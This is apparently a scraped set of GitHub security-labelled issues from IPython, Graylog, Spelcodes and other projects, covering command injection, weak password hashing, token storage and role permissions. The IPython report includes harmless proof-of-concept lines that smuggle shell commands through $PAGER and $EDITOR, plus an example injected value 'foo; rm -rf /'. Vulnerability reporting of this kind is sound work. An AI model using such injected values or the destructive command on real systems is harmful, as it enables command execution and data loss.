ipython/IPython/utils/sysinfo.py:58:12: DUO116 use of ""shell=True"" is insecure in ""subprocess"" module
```

I manually investigated each finding with the following results:

* `interactiveshell.py`: Unclear if vulnerable, unclear if `shell=True` is necessary
* `hooks.py`: Vulnerable via `$EDITOR, shell=True` unnecessary
* `page.py`: Vulnerable via `$PAGER`, `shell=True` unnecessary
* `editorhooks.py`: Unclear if vulnerable, unclear if shell=True is necessary
* `_process_commend.py`: Unclear if vulnerable, seems shell=True is necessary
* `sysinfo.py`: Not vulnerable, `shell=True` unnecessary

The following demonstrates the vulnerabilities in hooks and page:

```
$ PAGER='echo ""pager"" > /tmp/pager' ipython -c ""open??""
$ cat /tmp/pager
pager
```
```
$ EDITOR='echo ""editor"" > /tmp/editor' ipython -c ""%edit""
$ cat /tmp/editor
editor
```

This issue is highlighted in the Python subprocess docs: [Subprocess Security Considerations](https://docs.python.org/3/library/subprocess.html#security-considerations). This issue falls under CWE-77: [Improper Neutralization of Special Elements used in a Command ('Command Injection')](https://cwe.mitre.org/data/definitions/77.html). I would recommend avoiding `shell=True` whenever possible and investigating the other findings and ensuring they do not have the same issue. It appears that most of the calls do not need shell functionality anyway.

Let me know if you need any additional information!","Note: This conversation already happen on the security mailing list and is posted in public for transparency. 

--- 

@Carreau replied

Hi Matt,

Many thanks for the kind words, and thanks for the report, and for
pointing us to dlint..

A few questions and discussion though.
As far as I understand,  ""Command injection"" usually refer to
application that are not meant to run arbitrary command. But do so
under adversarial user input.

1) The goal of IPython **is** to run arbitrary commands; If you run
can run IPython, or enter commands into it you don't need to modify
$PAGER or $EDITOR to execute arbitrary commands. I'm also unsure how
an attacker would modify those env variable or provide adversarial
input.
2) I believe the `shell=True` is necessary (at least ini `$EDITOR`) in
both the case you outline we do want to explicitly run arbitrary
commands. For example $EDITOR='atom -w' to have a blocking GUI editor
after calling `%edit`. `Shell=False` will say `no such command 'atom
-w'` – I guess those can be handled by `shlex.split()`, but other like
ipython -c '%sx echo ""onpurpose"" > /tmp/onpurpose' really must use
shell (sx stands for shell execute).

So I'd like to better understand what your threat model is, or would
be for such attacks.
Does ""Command injection"" really make sens when the goal of the project
is arbitrary code  execution, or if I misunderstood some of the issues
behind command injections.

I understand that some of the above would be cleaner w/o shell=True,
at least to show good practice.

Let us know what you think, and wether there is a need to keep this
private; in which case i'm open to have this public on the IPython
repo and/or do a security advisory.

---- 

@takluyver replied

$PAGER can also include options, e.g. ""less -R"". So we can't easily switch away from shell=True there.

The threat model here would have to be an attacker that can set environment variables for a context where IPython will be used, but not give IPython commands directly or write anywhere on the filesystem (because if you can do that, you can point one of these environment variables to a script you've written, which gets run even with 'shell=False'). I imagine you can come up with some scenario like that, but given how IPython is designed to be used, I suspect those scenarios are pretty unlikely. If you figure out potential improvements in that area, I'd discuss them in the open rather than through the private security channels.

--- 

@mschwager replied

Hi,

Thanks for the clarifications. Based on your inputs it seems that there isn't much that can be done. Though I'd say avoiding shell=True is still a good practice :)

Since IPython is mostly a CLI/development-focused tool, it's unlikely that it's used in such a way where these concerns are exploitable. However, there are probably places where it's being used in an unusual, hard to envision scenario. Further, the attacker would have to be somewhat constrained. As already mentioned, the attacker would have to be able to set env variables but not files on the filesystem. But even in this situation, defensive programming (such as shlex or no shell) wouldn't stop something like: EDITOR='python -c ""<arbitrary code>""' ipython ...

If we consider some of the previously mentioned concerns:
Requiring arguments to script, e.g. 'atom -w': we could avoid shell=True here by using shlex.split. Although this still falls into trouble with the arbitrary code example above.
Handling shell execute functionality, e.g. '%sx': there's not much to be done here, this is the intended behavior :)
Thinking about shell=True a bit more... I believe this is most dangerous when user input is being concatenated with an existing string. For example, consider the following:

cmd = 'ls -l {}'
cmd = cmd.format(cmd, user_input_directory)
subprocess.Popen(cmd, shell=True)

The dangerous part here is that user input could be 'foo; rm -rf /'. Adding shell=True enables multiple commands with ';'. Although the IPython codebase doesn't contain this behavior (or at least doesn't where code execution isn't intended).

All in all I'd say that there's no security issues here. Although I would say shlex instead of shell=True would generally be better practice.

I appreciate all your feedback here and quick responses. I can use this to improve Dlint's analysis capabilities.

I've done #12024 to remove the one obvious with a static string. 
I think we can try `page.py` and `hook.py` with the `shlex.split()` independently.We should remember to check anything we want to change on Windows, unless it's something that would never run on Windows. I vaguely recall some cases where things mysteriously failed on Windows and setting `shell=True` was the fix (/workaround).",no,"security,"
forforf/BufsUI,432613,"Implement stronger security on file browsing","One idea would be to use mod_rewrite to prevent a user from being able to browse other users directories.  The current UI prevents this, but a user could put another user's path in the url to ge to their directory.  Perhaps a public key exchange via a custom HTTP header?.  Or maybe some form of http auth?
",,no,"Major,BetaBlocker,Security,"
forforf/BufsUI,206851,"Protecting from forgery","Determine whether to insert authenticity token via partial (or other server initiated method into the served web page), ajax query, or to exempt certain post methods (most notably the iframe updater)
",,no,"Major,BetaBlocker,Security,"
forforf/BufsUI,206210,"Secure Sign On","Update the sign on functions to be secure ... or at least protected from viewing by others
",,no,"Major,BetaBlocker,Security,"
todotxt/todo.txt-android,17379578,"Add option to grant only sandboxed Dropbox access","Several users have mentioned that Todo.txt makes them uncomfortable because it requires full Dropbox permissions. Still many others prefer that so they can set the location of the files.

Let's give users a choice between sandboxed access (default) and full permissions (explaining this will let them store the file whereever).

This choice should happen on the login screen, using radio buttons, where the sandboxed option is the default checked option.

- [x] Store my files in a preset application folder in Dropbox
- [ ] Let me choose the Dropbox folder where my files are stored

[ CONNECT TO DROPBOX] 

If the sandboxed option is chosen, we can remove the File location setting choice, and just show where it is located Dropbox/Todo.txt/ or whatever.
","Even in sandboxed apps I believe you can create subdirectories. So, we may not want to remove the File location setting. That way users can still have multiple todo files. The default location should be the ""root"" folder, though.
Ah yes, that's a good point.
This, I presume would need a 2nd dropbox App for this purpose, since the authorisation screen in dropbox also says what permissions are requested and that is App based I believe.

Do we also want a setting to allow users to change this later on if they change their mind? I see people maybe starting with the App, then starting to use more of the tools available and wanting more control over where the file is.

Finally should there be a visual indication of some kind which mode you're in, maybe different colour action bar or something?
> This, I presume would need a 2nd dropbox App for this purpose, since the authorisation screen in dropbox also says what permissions are requested and that is App based I believe.

Yes.

> Do we also want a setting to allow users to change this later on if they change their mind? I see people maybe starting with the App, then starting to use more of the tools available and wanting more control over where the file is.

To change the setting, the user can log out and log back in using the ""Let me choose"" option. The vast majority will  use and stick to the default.

> Finally should there be a visual indication of some kind which mode you're in, maybe different colour action bar or something?

I don't think that'll be necessary, but maybe once we start testing we can revisit.
Related to #481 ",no,"enhancement,security,"
Markkaz/Spelcodes,941899271,"Activation link is based on base64 encoded userid","This is security issue. An attacker can easily guess the next userid and activate an account without a valid e-mail address.",,no,"Security Issue,"
Markkaz/Spelcodes,943783585,"Weak password hashing algorithm","The old code used the PASSWORD function from MySQL. This function is now deprecated.
To make the tests pass and the code working again, I replaced everything with SHA256.
While this is better than nothing, it is still weak from security perspective because of the following reasons:
1. Every user that uses the same password will have the same hash. When an attacker can crack one of these passwords, they will know the password for all users with the same password
2. There are rainbow tables (lists of hashes and their value) available for weak passwords. An attacker can use these to crack at least the most common passwords
3. An attacker with enough GPU power can use an offline attack to bruteforce password hashes. Eventhough SHA256 is a good hashing algorithm, it will still be quick enough to crack any password under 8 characters.

The solution that we need is:
1. A better hashing algorithm that is slower to crack offline. For example bcrypt. Bcrypt will allow us to set an amount of time the hashing algorithm is repeated. When better GPUs come out and cracking becomes easier, we just increase the amount of times the hashing algorithm runs, to slow down an attacker doing bruteforce.
2. A unique salt per user. Which will make sure that every hash will be unique even if multiple users have the same password. And it will also make sure that small passwords will be long enough to make sure they aren't part of rainbow table.",,no,"Security Issue,"
Markkaz/Spelcodes,195489,"Posting topics or replies in forum is possilbe without being logged in","When you're not logged in and try to post a reply or a topic in the forum, it registers it as an empty reply and shows it in the overview. Probably a Location header without an exit behind it.
",,no,"Security Issue,"
Markkaz/Spelcodes,941907376,"XSS bugs in registration flow","The e-mail address and username are directly shown back to the user after registration without any output filtering.",,no,"Security Issue,"
Markkaz/Spelcodes,943679697,"Application vulnerable to SQL injection attacks","Not all parameters to queries are escaped and the escaping mechanism used is [addslashes](https://www.php.net/manual/en/function.addslashes.php). 
The documentation of addslashes states:
```
The addslashes() is sometimes incorrectly used to try to prevent SQL Injection. Instead, database-specific escaping functions and/or prepared statements should be used. 
```

The function [mysql_real_escape_string](https://www.php.net/manual/en/function.mysql-real-escape-string) should be used instead.",,no,"Security Issue,"
Graylog2/graylog2-server,718109557,"As an Admin User Access Tokens  of other users can be viewed in Plain","Dear Graylog Team,

we happiliy read the news about Graylog 3.3 with encrypted tokens https://docs.graylog.org/en/3.3/pages/upgrade/graylog-3.3.html#api-access-token-encryption . Our expection of this news, was that token are now handled similar to passwords. Unfortunely as an Admin one can see tokens of other users in Plaintext. 


## Expected Behavior
Tokens are hashed and salted in MongoDB and can not be seen anywhere in plain after creation.

## Current Behavior
Tokens are visible in Plaintext although they give the same access as the users password. 

## Possible Solution
Handle tokens as passwords and give only during creation of token the possiblity to read the token in plaintext. 

Ideally a User gets an E-Mail if someone creates a token in his usercontext, so he can control if the creation is wanted, additionally it would be a nice feature if tokens could be bound only to specific functions in a usercontext e.g. execution of a specific search. 

## Steps to Reproduce (for bugs)

1. Assign/create Token to/as  User
2. Admin and User can see the token in Plaintext
3. 
4.

## Context
Tokens should be treated as passwords and should have the same security regulations (salt and hash)


## Your Environment

* Graylog Version: 3.3
* Java Version: %
* Elasticsearch Version: %
* MongoDB Version: % 
* Operating System: %
* Browser version: %
","I think this was fixed in #9746, please reopen if needed. Thank you!Hi @edmundoa ,

I am not sure as this should be closed. The 'GUI Way' is now closed but the tokens are not hashed and salted in Database (if I did not made any mistake reviewing the linked issue)

In my opinion a follow up task would be in a upcoming release to hash and salt new tokens as if they were passwords and an migration step which 1.) Decrypts current Token (as they are currently ony crypted) 2.) Hash+Salt Token 3.) Save in DB as new value. 

As this would be a breaking change one can not downgrade graylog version without restoring mongodb backup but this was in the relese for 3.3 the same for token encryption. 

best regardsHi @HenryTheSir ,

it's true that the tokens are not hashed but only encrypted. This offers some means of protection by preventing the extraction of plaintext tokens if someone gains access to MongoDB alone. For decryption, additional access to the encryption key in `graylog.conf` is required.

Is the current solution posing a security concern for you?

Changing this to a salt+hash approach is unfortunately not as simple as salting, hashing and re-saving the token. When a token-based API request is authenticated, the Graylog server is presented a header of the form `<plaintext-token>:token`. It then needs to perform a lookup in MongoDB to find the token and the associated user. We are currently doing this by encrypting the incoming token and doing a simple index lookup for the encrypted value.

If the token was however hashed with an individual salt in MongoDB, we would need some additional information like a username or a token ID to look up the candidate tokens. This would mean a breaking change for our API.

We could investigate if storing the hashed token without a salt would be secure enough to do. After all, we are aiming to protect random values and not user-generated passwords. If so, this would probably be a solution for the lookup problem.Hi @thll ,
as in the opener of this issue: In my opinion the tokens should be handled as if they are a password, as they give the same access but are probably less frequently changed. 
Are the password for local users only encrypted as well in the mongodb? (I doubt it)

I would understand the described problem if the salt for every token would be different, but the implementation in the moment for hashing and salting passwords for local users uses for all passwords the same salt (password_secret of the graylog.conf). 
So one could query for the hashed+salted value in mongodb. Server takes incoming 'username' which is the token, salts and hashes the value and than looks up the value in mongodb. 
This brings just the 'breaking' change that with access to mongodb and graylog.conf one can not restore the actual token, as its handled with same privacy concerns as a password. 

best regards





> Are the password for local users only encrypted as well in the mongodb? (I doubt it)

No, they are hashed.

> I would understand the described problem if the salt for every token would be different, but the implementation in the moment for hashing and salting passwords for local users uses for all passwords the same salt (password_secret of the graylog.conf).

Actually, each user's password is salted with a unique salt. The default algorithm we are using is bcrypt. Unless I'm mistaken, `password_secret` is not used for peppering user passwords. The name of that config parameter is a bit misleading and probably has historic reasons.

> So one could query for the hashed+salted value in mongodb. Server takes incoming 'username' which is the token, salts and hashes the value and than looks up the value in mongodb.
> This brings just the 'breaking' change that with access to mongodb and graylog.conf one can not restore the actual token, as its handled with same privacy concerns as a password.

As I mentioned, hashing the tokens without a salt might be an option. Because unlike user-chosen passwords, they are less susceptible to rainbow table attacks. Using `password_secret` from `graylog.conf` as a system-wide pepper on top of that is probably not a bad idea either.

So I think this is a solution worth to further pursue. I'm reopening the issue.
",no,"security,improvement,"
Graylog2/graylog2-server,1364374651,"Custom default Reader role","At this moment, user with default _Reader_ role can watch input info and other information about clusters. 

On input page, for example in kafka custom config, they can found sensitive data

It would be nice to be able to remove the ability to access a number of pages for a role Reader.

Reader permissions scope:
```
""clusterconfigentry:read"",
""indexercluster:read"",
""messagecount:read"",
""journal:read"",
""messages:analyze"",
""inputs:read"",
""metrics:read"",
""fieldnames:read"",
""buffers:read"",
""system:read"",
""jvmstats:read"",
""decorators:read"",
""throughput:read"",
""messages:read""
```

## Your Environment

* Graylog Version: 4.3.5
* Elasticsearch Version: 7.10
* MongoDB Version: 4

",,no,"bug,security,triaged,to-verify,"
Graylog2/graylog2-server,414808363,"Limit System Overview","<!--- Provide a general summary of the issue in the Title above -->
I feel that more thought should be consider on what information is showed to the average Reader role (default role). I would like to work the Graylog team to better determine what permissions should be provided to the default reader role.

## Expected Behavior
Users with the Reader role would not be able to see the System tab/dropdown in navigation. They can also could not navigate directly to the pages Overview, Configuration, Nodes, and Enterprise.

## Current Behavior
Users with the Reader role can see the System tab/dropdown in navigation. They could also directly navigate to the pages Overview, Configuration, Nodes, and Enterprise.

## Possible Solutions
Add permission checks on the API and frontend components for all System tab and the Overview, Configuration, Nodes, and Enterprise page information. Reader role would still have access to Streams, Alerts, and Dashboards navigation tabs. 

Current Reader role permissions:
https://github.com/Graylog2/graylog2-server/blob/bcf53ec214ea302f8ec3ea0815a0a3c979bbaf13/graylog2-server/src/main/java/org/graylog2/shared/security/RestPermissions.java#L244-L262

Proposed permissions for Reader role would be:
```
DECORATORS_READ,
FIELDNAMES_READ,
MESSAGECOUNT_READ,
MESSAGES_ANALYZE,
MESSAGES_READ
```
* Saved Search permissions could be given as well. But right now saved searches can be accessed by any user. So I can save a search with specific information in it and another user could see it. So this needs to be either removed from default Reader or refactored.

Overall the roles create/edit code should be refactored allowing the choice of permissions from the backend. That way a end user (admin) can create any roles they would like. Not just inherit the default Reader role. Think of a Analyst and DevOps role. The DevOps role would want access to inputs, nodes, configuration for the system. But a Analyst wouldn't need that as they are just searching logs.

## Context
Graylog is often used as a aggregate logging platform that contains multiple sources of logs (often multiple companies information). It is important for users with the Reader role to only be able to access logs, dashboards, alerts, etc. that they have access to. Right now users with the default Reader role can see system wide stats/metrics (including Graylog version and JVM info) and  inputs (often containing info about the source). These are all leaking information that I believe a average Reader user should not see nor should see. As they are most likely just using Graylog to browse alerts/logs/dashboards.

From a security standpoint show the average user all inputs, metrics on nodes, and system information (Graylog version and JVM config) gives a compromised user account alot of ground to attack not only the Graylog environment, but also potential Graylog log sources.

## Your Environment
N/A
","Hi,

I strongly support this. For us, this issue is currently affecting the production deployment of customized Graylog environments to third-party application providers to have them check their own logs. 
Separating out the INPUTS_READ permission would be a huge benefit. We are working on switching over to the kafka input, but the kafka password is in plaintext in the input configuration, and the READER role has access to view all inputs.",no,"security,feature,triaged,"
Graylog2/graylog2-server,65458639,"REST API /streams/{streamId} returns password as clear text","When you issue a GET request for a specific stream `http://172.17.0.42:12900/streams/55116235e4b020d47079443a` and the configuration data in the stream contains a password, the password field is returned as clear text (see `CONFIG_AMQP_PASSWORD` and password `guest`):

```
{
  ""creator_user_id"": ""admin"",
  ""outputs"": [
    {
      ""creator_user_id"": ""admin"",
      ""configuration"": {
        ""CONFIG_AMQP_SERVER_NAME"": ""172.17.0.44"",
        ""CONFIG_AMQP_PUBLISH_TARGET"": ""EXCHANGE"",
        ""CONFIG_AMQP_VIRTUAL_HOST"": ""/"",
        ""CONFIG_AMQP_SERVER_PORT"": 5672,
        ""CONFIG_AMQP_EXCHANGE_NAME"": ""mySuperExchange"",
        ""CONFIG_AMQP_USER_NAME"": ""guest"",
        ""CONFIG_AMQP_ROUTING_KEY"": ""#"",
        ""CONFIG_AMQP_PASSWORD"": ""guest""
      },
      ""created_at"": ""2015-03-30T13:32:38.548+0000"",
      ""id"": ""55195076e4b067075020c785"",
      ""title"": ""amqp"",
      ""type"": ""biz.dfch.j.graylog.plugin.output.AmqpClientClass"",
      ""content_pack"": null
    }
  ],
  ""description"": ""Default metrics stream"",
  ""created_at"": ""2015-03-24T13:10:13.764Z"",
  ""disabled"": false,
  ""rules"": [
    {
      ""field"": ""message"",
      ""stream_id"": ""55116235e4b020d47079443a"",
      ""id"": ""55116246e4b020d47079444e"",
      ""type"": 1,
      ""inverted"": false,
      ""value"": ""metrics""
    }
  ],
  ""id"": ""55116235e4b020d47079443a"",
  ""title"": ""Metrics"",
  ""content_pack"": null
}
```

This issue relates to graylog2/graylog2-web-interface#1134 . The fix was obviously only done in web interface (but must be applied to the underlying REST service).
",,no,"bug,security,triaged,"
Graylog2/graylog2-server,396995594,"User tokens cannot be edited","It is not possible to edit a user token.
You can generate and delete a token, but can not edit its value.

## Expected Behavior
There are scenarios where it is useful to use a token that
has been created outside of graylog.
Take the `graylog-sidecar` user token for example:
You want to migrate to a new graylog server, but want to keep the existing
token, because otherwise you'd have to update all existing Sidecars to a new token.
",,no,"bug,security,triaged,sidecar,"
Graylog2/graylog2-server,197185351,"Implement web interface part for certificate management","_From @dennisoelkers on November 1, 2013 12:12_

SSL support for inputs requires a way for the user to manage the configured certificates in the server's keystore. So we need some functions in the web interface to add/delete/edit certificates.


_Copied from original issue: Graylog2/graylog2-web-interface#364_",,no,"security,feature,triaged,"
Graylog2/graylog2-server,37063139,"CAS authentication","Originally reported as https://github.com/Graylog2/graylog2-web-interface/issues/806 by @failshell:

It would be nice if the web interface could support [CAS](http://www.jasig.org/cas) as a source of authentication.

Why? It allows to abstract the auth source. In our case, we can't use the LDAP auth, as we have several AD domains in a forest.

We'd be happy to help alpha test this feature if it were ever to be implemented.
","Is there any progress?
Perhaps this could be a more general RFE topic, SSO authentication, as per: https://github.com/Graylog2/graylog2-web-interface/issues/560
> We'd be happy to help alpha test this feature if it were ever to be implemented.

+1
depends on #2232
",no,"security,feature,triaged,"
Graylog2/graylog2-server,31232705,"Message field level ACL security","Allow to define what message fields users can see. Just do not return those fields that are not allowed from the REST API.

For example: Permission group _foo_ is allowed to see all messages but not allowed to see the field _remote_ip_ and _email_address_.
","This needs a little more specs, for example, what happens at search time?
If I'm not allowed to see the contents of a field, but I know what I'm looking for, but want to retrieve other information about the log message, can I perform the search?

For example:
A structured access log contains the username, request date, request url and full IP address for auditing purposes.
The IP address is restricted to very few people in the security team. A user not in the security team cannot see the IP field displayed (or via the REST API).
However, by guessing IP addresses the user can perform searches on the field (directly or indirectly), but won't see the field value. However she already knows the content of that field but wants to get information which user corresponds to that IP.
The user field is readily visible.

Thus, to be useful and secure, the same restrictions need to be applied when searching as well, which likely needs a parser interface for the queries.
",no,"security,feature,triaged,"
Graylog2/graylog2-server,380613096,"add option for user password rules (complexity/length)","## Expected Behavior
It should be possible to configure rules for the passwords in Graylog to apply local policies to the Graylog local users. 

## Context
Current Graylog only has 6 character limit on the passwords for local users but did not allow to adjust the rules for user passwords to the local rules. That could be a longer password or a given complexity. 

This would add more security and would allow users to apply with auditor given rules and their local Graylog users.

## Your Environment

* Graylog Version: 2.4.6

HS-752580481
","Hello guys, is that functionality was added to graylog? Are there any prediction when we will have it? Thanks.Another user has requested the ability to set password length / complexity / retry attempts. ""Enterprise customer requesting this feature in HS-752580481""@boosty Ping",no,"security,feature,triaged,"
Graylog2/graylog2-server,605463994,"Integration test to detect unprotected API endpoints","
## What?

We should think about adding a test that can detect endpoints
that are unauthenticated or don't require permissions.


## Why?
Prevent security bugs.


## How?
Check all endpoints for missing `@RequiresAuthentication` and `@RequiresPermissions` annotations.
This might produce some false positives, since not all are secured with annotations, but programmatically.

","This code could be of help implementing this:

```
/**
 * A Jersey {@link ModelProcessor} that checks each resource method for authentication annotations.
 * <p>
 * It <b>stops the JVM process</b> if there are any resource methods which are not protected by authentication. This is a
 * security measure to avoid exposing unauthenticated resource endpoints by accident.
 * <p>
 * Endpoints which are supposed to be accessible without authentication should be annotated with the
 * {@link PublicResource} annotation.
 */
public class AuthResourceChecker implements ModelProcessor {
    @Override
    public ResourceModel processResourceModel(ResourceModel resourceModel, Configuration configuration) {
        checkResources(resourceModel.getResources());
        return resourceModel;
    }

    @Override
    public ResourceModel processSubResource(ResourceModel subResourceModel, Configuration configuration) {
        checkResources(subResourceModel.getResources());
        return subResourceModel;
    }

    private void checkResources(List<Resource> resources) {
        final List<UnprotectedEndpoint> unprotectedEndpoints = new ArrayList<>();

        for (final Resource resource : resources) {
            unprotectedEndpoints.addAll(checkResource(resource));
        }

        if (!unprotectedEndpoints.isEmpty()) {
            System.out.println(""================================================================================"");
            System.out.println(""    "" + unprotectedEndpoints.size() + "" UNPROTECTED API ENDPOINTS!"");
            System.out.println(""================================================================================"");
            System.out.println();
            for (final UnprotectedEndpoint endpoint : unprotectedEndpoints) {
                System.out.println(""    Unprotected API endpoint: "" + endpoint);
            }
            System.out.println();
            System.out.println(""NOTE: If one of these endpoints is supposed to be public, use the"");
            System.out.println(""      @PublicResource annotation on the resource method."");
            System.out.println(""================================================================================"");
            System.exit(1);
        }
    }

    private List<UnprotectedEndpoint> checkResource(Resource resource) {
        final List<UnprotectedEndpoint> unprotectedEndpoints = new ArrayList<>();

        for (final ResourceMethod method : resource.getResourceMethods()) {
            final Method m = method.getInvocable().getDefinitionMethod();

            if (!isProtected(m)) {
                unprotectedEndpoints.add(new UnprotectedEndpoint(method.getHttpMethod(), getPathFromResource(resource)));
            }
        }

        for (final Resource childResource : resource.getChildResources()) {
            unprotectedEndpoints.addAll(checkResource(childResource));
        }

        return unprotectedEndpoints;
    }

    private boolean isProtected(Method m) {
        // First check if the method has authentication annotations or if it is supposed to be public
        if (m.isAnnotationPresent(PermitAll.class) || m.isAnnotationPresent(RolesAllowed.class) || m.isAnnotationPresent(DenyAll.class) || m.isAnnotationPresent(PublicResource.class)) {
            return true;
        }

        // If the previous check fails, check if any method parameter is annotated with Auth (which implicitly enables authentication for the method)
        for (Annotation[] parameterAnnotations : m.getParameterAnnotations()) {
            for (Annotation annotation : parameterAnnotations) {
                if (annotation.annotationType().equals(Auth.class)) {
                    return true;
                }
            }
        }

        return false;
    }

    private String getPathFromResource(Resource resource) {
        String path = resource.getPath();
        Resource parent = resource.getParent();

        while (parent != null) {
            if (!path.startsWith(""/"")) {
                //noinspection StringConcatenationInLoop
                path = ""/"" + path;
            }

            //noinspection StringConcatenationInLoop
            path = parent.getPath() + path;
            parent = parent.getParent();
        }

        return path;

    }

    private static class UnprotectedEndpoint {
        final String httpMethod;
        final String resourcePath;

        UnprotectedEndpoint(String httpMethod, String resourcePath) {
            this.httpMethod = httpMethod;
            this.resourcePath = resourcePath;
        }

        @Override
        public String toString() {
            return String.format(Locale.US, ""%6s %s"", httpMethod, resourcePath);
        }
    }
}
```",no,"security,infrastructure,feature,triaged,"
Graylog2/graylog2-server,583845377,"Email transport needs TLS trust settings","Each in- or outbound connection that supports TLS needs a full complement of setttings to be specified, particularly the certificates that are to be trusted. The CA I trust for our elasticsearch cluser is not necessarily the same as for e.g. SMTP servers.

## Expected Behavior
For each kind of system-level in- or outbound connection (https, elasticsearch back-end, email, etc.), it must be possible to specify different truststores or trusted certificate files.

## Current Behavior
The system-wide truststore is used for all connections, which is not desirable and in fact significantly weakens protection, particularly on the elasticsearch and mongodb back-end connections.

## Context
There are serious issues with the way certificate trust is implemented. As it seems, the only way to configure trusted certificates is to use a system-wide truststore, defined at startup. This is a major concern since the certificates presented by our elasticsearch cluster (for example) are internal only, and we specifically do not want to trust anything else for those connections. The problem rears its head when trying to configure SSL or TLS for email; the same truststore is being used but the email server is presenting a commercially-issued certificate, which is not in the truststore. In addition, creating the dependency of having to modify the truststore whenever the email server changes certificate authority _will_ cause outages, and one is not necessarily notified when this happens.

In other words: For each purpose, a separate truststore setting is needed - much like each input can have its own TLS certificate and trusted certificates specified.

## Your Environment
* Graylog Version: 3.1.3
* Operating System: FreeBSD 12.1
",,no,"security,feature,triaged,"
Graylog2/graylog2-server,789159804,"Minor security improvement: Prevention of software version exposure","We are running Graylog 3.3.8 in a project and recently made a security scan looking for vulnerabilities. 
The scans showed that under the following endpoints...
/api/system
/api/system/jvm
/assets/builtins.4678e54c30f1075e4dd8.js
/assets/plugin/org.graylog.aws.AWSPlugin/plugin.org.graylog.aws.AWSPlugin.f2cd3046f5d8c08ce593.js
/api/

... information about the used software versions can be retrieved: 
Generic: 3.3.8+e223f85
Linux: 3.10.0-1127.13.1.el7.x86_64
Oracle Java: 5
Underscore.js: 1.8.3

As the knowledge about used software versions potentially offers the chance to plan attacks against the software, I am reporting these insights so that security can be improved. This is of course a minor topic, even though the report is hopefully helpful to improve Graylog. ",,no,"security,triaged,improvement,"
Graylog2/graylog2-server,486436307,"add certificate authentication to elasticsearch ","

## Context
Elasticsearch is now providing with searchguard plugin or the x-pack security feature the ability to authenticate with a certificate. 

Graylog should be able to authenticate not only with username/password but also certificates to make elasticsearch connection more secure.



## Your Environment
* Graylog Version: 3.1
* Elasticsearch Version: 6.8","Two links that can help building a development environment to test this:
Run Elasticsearch in docker with SSL: https://www.elastic.co/guide/en/elasticsearch/reference/6.8/configuring-tls-docker.html
Configure client certificate Auth: https://www.elastic.co/es/blog/elasticsearch-security-configure-tls-ssl-pki-authentication
How are client certificates going to be configured?
- In conf file on all servers specifying the filesystem path to the certificate, and the optional passphrase to decrypt the file
- In Cluster config, using the UI?

What kind of certificate files are going to be supported? PKCS12, PEM, both?
Any updates on this feature?
I can't find any configurations of Graylog and Elasticsearch authentication with certificates, so I assume it is not implemented yet.Anything planned yet to implement this ?  Also for the connection to mongodb this should also be nice,  Any updates on this will be appreciated very much @johan-open-future
for mongodb this is already working once you added the certificates to the trust/keystores and added the subjectname of the clientcertificate as username to the mongouri.

I've found no way to get client certificate authentication to work with open search though.
",no,"elasticsearch,security,feature,triaged,"
Graylog2/graylog2-server,307186722,"Field suggestion in search should not display all fields","## Expected Behavior
When you use the field suggestion inside of a stream it should only display fields that are visible/used inside of that stream.

## Current Behavior
Graylog suggestion from all fields that are available.

## Context
If you run Graylog with multiple user groups with seperated data and restricted access to data, it might be a security risk having all available fields exposed. In addition it will confuse users because they see field names their specific view did not include and the product looks broken/unuseable to them.

## Your Environment
<!--- Include as many relevant details about the environment you experienced the bug in -->

* Graylog Version: 2.4.3
",,no,"security,feature,triaged,search,"
Graylog2/graylog2-server,1099430472,"Vdoo Scan results ","Hello,

I made an inline scan of Graylog 4.2.5 docker using Vdoo.

Below some of the vunerabilities found for Graylog.

Could you tell me if these vulnerabilities are false-positives ?

If not, do you have any plan to fix them ? Meanwhile, have you done any CVSS scoring in the context of Graylog ?

Thanks, 
Anass

com.fasterxml.jackson.core:jackson-databind :: [CVE-2020-36189](https://nvd.nist.gov/vuln/detail/CVE-2020-36189) and (CVE-2020-36188/CVE-2020-36183/CVE-2020-35728/CVE-2020-24750/CVE-2020-24616/CVE-2020-1406(0/1/2/7)/CVE-2019-16335/CVE-2019-14893/CVE-2019-14540)
io.netty:netty-handler :: [CVE-2020-11612](https://nvd.nist.gov/vuln/detail/CVE-2020-11612)
org.apache.shiro:shiro-core :: [CVE-2021-41303](https://nvd.nist.gov/vuln/detail/CVE-2021-41303) [CVE-2020-17523](https://nvd.nist.gov/vuln/detail/CVE-2020-17523) [CVE-2020-13933](https://nvd.nist.gov/vuln/detail/CVE-2020-13933) [CVE-2020-11989](https://nvd.nist.gov/vuln/detail/CVE-2020-11989) 
glibc :: [CVE-2021-33574](https://nvd.nist.gov/vuln/detail/CVE-2021-33574)
",,no,"security,triaged,"
Graylog2/graylog2-server,884472736,"SMTP Password Security","Including the SMTP password in the config does not seem secure. Is there a way to input this via the web UI so that it can be stored in an encrypted format?","@john-larson This is currently not possible. We are filing this as a feature request. Thank you!",no,"security,feature,triaged,"
Graylog2/graylog2-server,391951609,"Graylog ldap should not allow users that are not in groups to log-in","<!--- Provide a general summary of the issue in the Title above -->

When setting a group filter for LDAP, Graylog defaults to reader for users that are not in any of the groups. There is no option to set this to none. 

## Expected Behavior

Users that are not in any groups of the group filter should not able to login in, or a option to no access should be added.

## Current Behavior

A user that is not in any access groups can log in and is given reader access.  security issue (in particular when they can view inputs etc..).

## Possible Solution

1. Add an option on the LDAP group page to disable access for ""no group"".
2. Don't use LDAP in Graylog

And no, memberof in the user search filter is not an option. Most large setups do not use this overlay.

## Context

A large LDAP setup does not generally provide a member of overlay; so the search filter is not the place to block group level access, the group filter is. 
This renders the use of LDAP a security issue.
It becomed more problemetic if you combine it with SSO.
Users with SSO will get their user setup and access stomped over if they end up logging into LDAP as default reader when SSO is down, when in fact they should not be able to log-in at all as they are not in any groups (but are part of the LDAP directory).

In general, in the context of security, access should not be granted by any default value, and should have to assigned.

## Your Environment

* Graylog Version: 2.4
* Elasticsearch Version: 5.6
* MongoDB Version: 3.4
* Operating System: centos
* Browser version: chrome.
","Any chance of getting this into 3.0? We cannot use GL's ldap without this (all >500K listed ldap users would get reader access).@jam49 no, this is not going to be in 3.0. As a workaround until we get to do this, you need to restrict your user search pattern to only match users that should be allowed to login.Sorry, The workaround isn't possible with most setups. Short of writing my own ldap provider for Graylog, We are out of options (the memberof overlay is not an option).+1 on this, either allow the option for default role to be NONE (no login), or require a group mapping if at least 1 mapping exists.

In an enterprise structure we cannot easily create a search pattern specific to graylog (such as a specific OU) and opens security risks - @lennartkoopmann @jam49 why is the ""memberof"" overlay not an option and how would this look like in an practical example?",no,"security,feature,triaged,ldap,"
Graylog2/graylog2-server,313197383,"Reader role give user access to system related information via System menu","<!--- Provide a general summary of the issue in the Title above -->
